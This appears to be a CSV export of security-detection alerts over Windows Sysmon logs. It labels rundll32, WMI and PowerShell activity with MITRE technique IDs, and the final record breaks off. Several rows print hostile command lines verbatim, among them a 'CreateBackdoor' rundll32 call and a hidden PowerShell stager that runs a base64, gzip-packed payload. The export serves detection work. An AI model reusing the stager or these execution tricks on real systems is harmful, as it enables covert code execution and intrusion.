<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""5770385F-C22A-43E0-BF4C-06F5698FFBD9"">
    </Provider>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2020-01-14T20:44:50.353148Z"">
    </TimeCreated>
    <EventRecordID>336</EventRecordID>
    <Correlation>
    </Correlation>
    <Execution ProcessID=""1840"" ThreadID=""8032"">
    </Execution>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>MSEDGEWIN10</Computer>
    <Security UserID=""S-1-5-18"">
    </Security>
  </System>
  <EventData>
    <Data Name=""RuleName""></Data>
    <Data Name=""UtcTime"">2020-01-14 20:44:50.348</Data>
    <Data Name=""ProcessGuid"">747F3D96-2842-5E1E-0000-00100C417A00</Data>
    <Data Name=""ProcessId"">4180</Data>
    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""FileVersion"">10.0.17763.1 (WinBuild.160101.0800)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""OriginalFileName"">RUNDLL32.EXE</Data>
    <Data Name=""CommandLine"">rundll32 url.dll,FileProtocolHandler ms-browser://</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">MSEDGEWIN10\IEUser</Data>
    <Data Name=""LogonGuid"">747F3D96-2842-5E1E-0000-0020FF3A7A00</Data>
    <Data Name=""LogonId"">0x7a3aff</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">High</Data>
    <Data Name=""Hashes"">SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A</Data>
    <Data Name=""ParentProcessGuid"">747F3D96-2842-5E1E-0000-0010903C7A00</Data>
    <Data Name=""ParentProcessId"">1628</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding</Data>
  </EventData>
</Event>",MSEDGEWIN10,Microsoft-Windows-Sysmon/Operational
[T1085] Rundll32 Execution detected,1579034691.01611,2020-01-15T00:44:51.016110+04:00,,Threat,High,"Found User (MSEDGEWIN10\IEUser) running image ( C:\Windows\System32\rundll32.exe ) through command line ( rundll32 url.dll,FileProtocolHandler ms-browser:// )",1,"<?xml version=""1.0"" encoding=""utf-8""?>
<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""5770385F-C22A-43E0-BF4C-06F5698FFBD9"">
    </Provider>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2020-01-14T20:44:50.353148Z"">
    </TimeCreated>
    <EventRecordID>336</EventRecordID>
    <Correlation>
    </Correlation>
    <Execution ProcessID=""1840"" ThreadID=""8032"">
    </Execution>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>MSEDGEWIN10</Computer>
    <Security UserID=""S-1-5-18"">
    </Security>
  </System>
  <EventData>
    <Data Name=""RuleName""></Data>
    <Data Name=""UtcTime"">2020-01-14 20:44:50.348</Data>
    <Data Name=""ProcessGuid"">747F3D96-2842-5E1E-0000-00100C417A00</Data>
    <Data Name=""ProcessId"">4180</Data>
    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""FileVersion"">10.0.17763.1 (WinBuild.160101.0800)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""OriginalFileName"">RUNDLL32.EXE</Data>
    <Data Name=""CommandLine"">rundll32 url.dll,FileProtocolHandler ms-browser://</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">MSEDGEWIN10\IEUser</Data>
    <Data Name=""LogonGuid"">747F3D96-2842-5E1E-0000-0020FF3A7A00</Data>
    <Data Name=""LogonId"">0x7a3aff</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">High</Data>
    <Data Name=""Hashes"">SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A</Data>
    <Data Name=""ParentProcessGuid"">747F3D96-2842-5E1E-0000-0010903C7A00</Data>
    <Data Name=""ParentProcessId"">1628</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding</Data>
  </EventData>
</Event>",MSEDGEWIN10,Microsoft-Windows-Sysmon/Operational
[T1059] Command-Line Interface,1564436040.330766,2019-07-30T01:34:00.330766+04:00,,Threat,Low,Found User (MSEDGEWIN10\IEUser) running image ( C:\Windows\System32\cmd.exe ) through command line ( cmd  /c netsh trace stop ),1,"<?xml version=""1.0"" encoding=""utf-8""?>
<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""5770385F-C22A-43E0-BF4C-06F5698FFBD9"">
    </Provider>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2019-07-29T21:33:58.683059Z"">
    </TimeCreated>
    <EventRecordID>4950</EventRecordID>
    <Correlation>
    </Correlation>
    <Execution ProcessID=""2640"" ThreadID=""3476"">
    </Execution>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>MSEDGEWIN10</Computer>
    <Security UserID=""S-1-5-18"">
    </Security>
  </System>
  <EventData>
    <Data Name=""RuleName""></Data>
    <Data Name=""UtcTime"">2019-07-29 21:33:58.370</Data>
    <Data Name=""ProcessGuid"">747F3D96-6646-5D3F-0000-0010913A8B00</Data>
    <Data Name=""ProcessId"">6232</Data>
    <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
    <Data Name=""FileVersion"">10.0.17763.1 (WinBuild.160101.0800)</Data>
    <Data Name=""Description"">Windows Command Processor</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">cmd  /c netsh trace stop</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">MSEDGEWIN10\IEUser</Data>
    <Data Name=""LogonGuid"">747F3D96-6053-5D3F-0000-002082314100</Data>
    <Data Name=""LogonId"">0x413182</Data>
    <Data Name=""TerminalSessionId"">1</Data>
    <Data Name=""IntegrityLevel"">High</Data>
    <Data Name=""Hashes"">SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data>
    <Data Name=""ParentProcessGuid"">747F3D96-6609-5D3F-0000-00109FBF8500</Data>
    <Data Name=""ParentProcessId"">1208</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
    <Data Name=""ParentCommandLine"">&quot;C:\Windows\System32\cmd.exe&quot; /C &quot;C:\ProgramData\ssh\runtests.bat&quot; </Data>
  </EventData>
</Event>",MSEDGEWIN10,Microsoft-Windows-Sysmon/Operational
[T1117] Bypassing Application Whitelisting,1584766825.46327,2020-03-21T09:00:25.463270+04:00,,Threat,High,"[T1117] Bypassing Application Whitelisting , Process ( C:\Windows\System32\rundll32.exe) with commandline ( rundll32 windowscoredeviceinfo.dll,CreateBackdoor)",1,"<?xml version=""1.0"" encoding=""utf-8""?>
<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""5770385F-C22A-43E0-BF4C-06F5698FFBD9"">
    </Provider>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2020-03-21T05:00:25.459240Z"">
    </TimeCreated>
    <EventRecordID>243558</EventRecordID>
    <Correlation>
    </Correlation>
    <Execution ProcessID=""2860"" ThreadID=""3508"">
    </Execution>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>MSEDGEWIN10</Computer>
    <Security UserID=""S-1-5-18"">
    </Security>
  </System>
  <EventData>
    <Data Name=""RuleName""></Data>
    <Data Name=""UtcTime"">2020-03-21 05:00:25.452</Data>
    <Data Name=""ProcessGuid"">747F3D96-9F69-5E75-0000-001035972000</Data>
    <Data Name=""ProcessId"">1388</Data>
    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""FileVersion"">10.0.17763.1 (WinBuild.160101.0800)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""OriginalFileName"">RUNDLL32.EXE</Data>
    <Data Name=""CommandLine"">rundll32 windowscoredeviceinfo.dll,CreateBackdoor</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">747F3D96-9DBA-5E75-0000-0020E7030000</Data>
    <Data Name=""LogonId"">0x3e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A</Data>
    <Data Name=""ParentProcessGuid"">747F3D96-9DBC-5E75-0000-00102C390100</Data>
    <Data Name=""ParentProcessId"">1652</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s wuauserv</Data>
  </EventData>
</Event>",MSEDGEWIN10,Microsoft-Windows-Sysmon/Operational
[T1047] Windows Management Instrumentation - Process,1579034691.01611,2020-01-15T00:44:51.016110+04:00,,Threat,High,"Found User (MSEDGEWIN10\IEUser) running image ( C:\Windows\System32\rundll32.exe ) through command line ( rundll32 url.dll,FileProtocolHandler ms-browser:// )",1,"<?xml version=""1.0"" encoding=""utf-8""?>
<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""5770385F-C22A-43E0-BF4C-06F5698FFBD9"">
    </Provider>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2020-01-14T20:44:50.353148Z"">
    </TimeCreated>
    <EventRecordID>336</EventRecordID>
    <Correlation>
    </Correlation>
    <Execution ProcessID=""1840"" ThreadID=""8032"">
    </Execution>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>MSEDGEWIN10</Computer>
    <Security UserID=""S-1-5-18"">
    </Security>
  </System>
  <EventData>
    <Data Name=""RuleName""></Data>
    <Data Name=""UtcTime"">2020-01-14 20:44:50.348</Data>
    <Data Name=""ProcessGuid"">747F3D96-2842-5E1E-0000-00100C417A00</Data>
    <Data Name=""ProcessId"">4180</Data>
    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""FileVersion"">10.0.17763.1 (WinBuild.160101.0800)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""OriginalFileName"">RUNDLL32.EXE</Data>
    <Data Name=""CommandLine"">rundll32 url.dll,FileProtocolHandler ms-browser://</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">MSEDGEWIN10\IEUser</Data>
    <Data Name=""LogonGuid"">747F3D96-2842-5E1E-0000-0020FF3A7A00</Data>
    <Data Name=""LogonId"">0x7a3aff</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">High</Data>
    <Data Name=""Hashes"">SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A</Data>
    <Data Name=""ParentProcessGuid"">747F3D96-2842-5E1E-0000-0010903C7A00</Data>
    <Data Name=""ParentProcessId"">1628</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding</Data>
  </EventData>
</Event>",MSEDGEWIN10,Microsoft-Windows-Sysmon/Operational
[T1047] Windows Management Instrumentation - Instances of an Active Script Event Consumer - Process,1579034691.01611,2020-01-15T00:44:51.016110+04:00,,Threat,High,"Found User (MSEDGEWIN10\IEUser) running image ( C:\Windows\System32\rundll32.exe ) through command line ( rundll32 url.dll,FileProtocolHandler ms-browser:// )",1,"<?xml version=""1.0"" encoding=""utf-8""?>
<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""5770385F-C22A-43E0-BF4C-06F5698FFBD9"">
    </Provider>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2020-01-14T20:44:50.353148Z"">
    </TimeCreated>
    <EventRecordID>336</EventRecordID>
    <Correlation>
    </Correlation>
    <Execution ProcessID=""1840"" ThreadID=""8032"">
    </Execution>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>MSEDGEWIN10</Computer>
    <Security UserID=""S-1-5-18"">
    </Security>
  </System>
  <EventData>
    <Data Name=""RuleName""></Data>
    <Data Name=""UtcTime"">2020-01-14 20:44:50.348</Data>
    <Data Name=""ProcessGuid"">747F3D96-2842-5E1E-0000-00100C417A00</Data>
    <Data Name=""ProcessId"">4180</Data>
    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""FileVersion"">10.0.17763.1 (WinBuild.160101.0800)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""OriginalFileName"">RUNDLL32.EXE</Data>
    <Data Name=""CommandLine"">rundll32 url.dll,FileProtocolHandler ms-browser://</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">MSEDGEWIN10\IEUser</Data>
    <Data Name=""LogonGuid"">747F3D96-2842-5E1E-0000-0020FF3A7A00</Data>
    <Data Name=""LogonId"">0x7a3aff</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">High</Data>
    <Data Name=""Hashes"">SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A</Data>
    <Data Name=""ParentProcessGuid"">747F3D96-2842-5E1E-0000-0010903C7A00</Data>
    <Data Name=""ParentProcessId"">1628</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding</Data>
  </EventData>
</Event>",MSEDGEWIN10,Microsoft-Windows-Sysmon/Operational
"[T1117] Bypassing Application Whitelisting with Regsvr32,rundll32,certutil or scrobj ",1584766825.46327,2020-03-21T09:00:25.463270+04:00,,Threat,High,"Found User (NT AUTHORITY\SYSTEM) running image ( C:\Windows\System32\rundll32.exe ) through command line ( rundll32 windowscoredeviceinfo.dll,CreateBackdoor )",1,"<?xml version=""1.0"" encoding=""utf-8""?>
<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""5770385F-C22A-43E0-BF4C-06F5698FFBD9"">
    </Provider>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2020-03-21T05:00:25.459240Z"">
    </TimeCreated>
    <EventRecordID>243558</EventRecordID>
    <Correlation>
    </Correlation>
    <Execution ProcessID=""2860"" ThreadID=""3508"">
    </Execution>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>MSEDGEWIN10</Computer>
    <Security UserID=""S-1-5-18"">
    </Security>
  </System>
  <EventData>
    <Data Name=""RuleName""></Data>
    <Data Name=""UtcTime"">2020-03-21 05:00:25.452</Data>
    <Data Name=""ProcessGuid"">747F3D96-9F69-5E75-0000-001035972000</Data>
    <Data Name=""ProcessId"">1388</Data>
    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""FileVersion"">10.0.17763.1 (WinBuild.160101.0800)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""OriginalFileName"">RUNDLL32.EXE</Data>
    <Data Name=""CommandLine"">rundll32 windowscoredeviceinfo.dll,CreateBackdoor</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">747F3D96-9DBA-5E75-0000-0020E7030000</Data>
    <Data Name=""LogonId"">0x3e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A</Data>
    <Data Name=""ParentProcessGuid"">747F3D96-9DBC-5E75-0000-00102C390100</Data>
    <Data Name=""ParentProcessId"">1652</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s wuauserv</Data>
  </EventData>
</Event>",MSEDGEWIN10,Microsoft-Windows-Sysmon/Operational
[ T1086 ]  Powershell with Suspicious Argument,1556656012.371714,2019-05-01T00:26:52.371714+04:00,,Threat,Critical,"Found User (NT AUTHORITY\SYSTEM) run Suspicious PowerShell commands that include ( -c ,[Convert]::FromBase64String,hidden,ls, -noni ,-noni,-nop,powershell, -w , -w hidden , -c ,[Convert]::FromBase64String,hidden,Hidden,ls, -noni ,-noni,-nop,powershell, -w , -w hidden ,WindowStyle) in event with Command Line (&quot;powershell.exe&quot; -noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(&apos;H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==&apos;))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))) and Parent Image :C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe , Parent CommandLine (powershell.exe  -nop -w hidden -noni -c &quot;if([IntPtr]::Size -eq 4){$b=&apos;powershell.exe&apos;}else{$b=$env:windir+&apos;\syswow64\WindowsPowerShell\v1.0\powershell.exe&apos;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&apos;-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(&apos;&apos;H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==&apos;&apos;))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&apos;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=&apos;Hidden&apos;;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);&quot;) in directory : ( C:\Windows\system32\ )",1,"<?xml version=""1.0"" encoding=""utf-8""?>
<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""5770385F-C22A-43E0-BF4C-06F5698FFBD9"">
    </Provider>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2019-04-30T20:26:52.356089Z"">
    </TimeCreated>
    <EventRecordID>9809</EventRecordID>
    <Correlation>
    </Correlation>
    <Execution ProcessID=""1964"" ThreadID=""1664"">
    </Execution>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>IEWIN7</Computer>
    <Security UserID=""S-1-5-18"">
    </Security>
  </System>
  <EventData>
    <Data Name=""RuleName""></Data>
    <Data Name=""UtcTime"">2019-04-30 20:26:52.356</Data>
    <Data Name=""ProcessGuid"">365ABB72-AF8C-5CC8-0000-001003361900</Data>
    <Data Name=""ProcessId"">2484</Data>
    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
    <Data Name=""Description"">Windows PowerShell</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
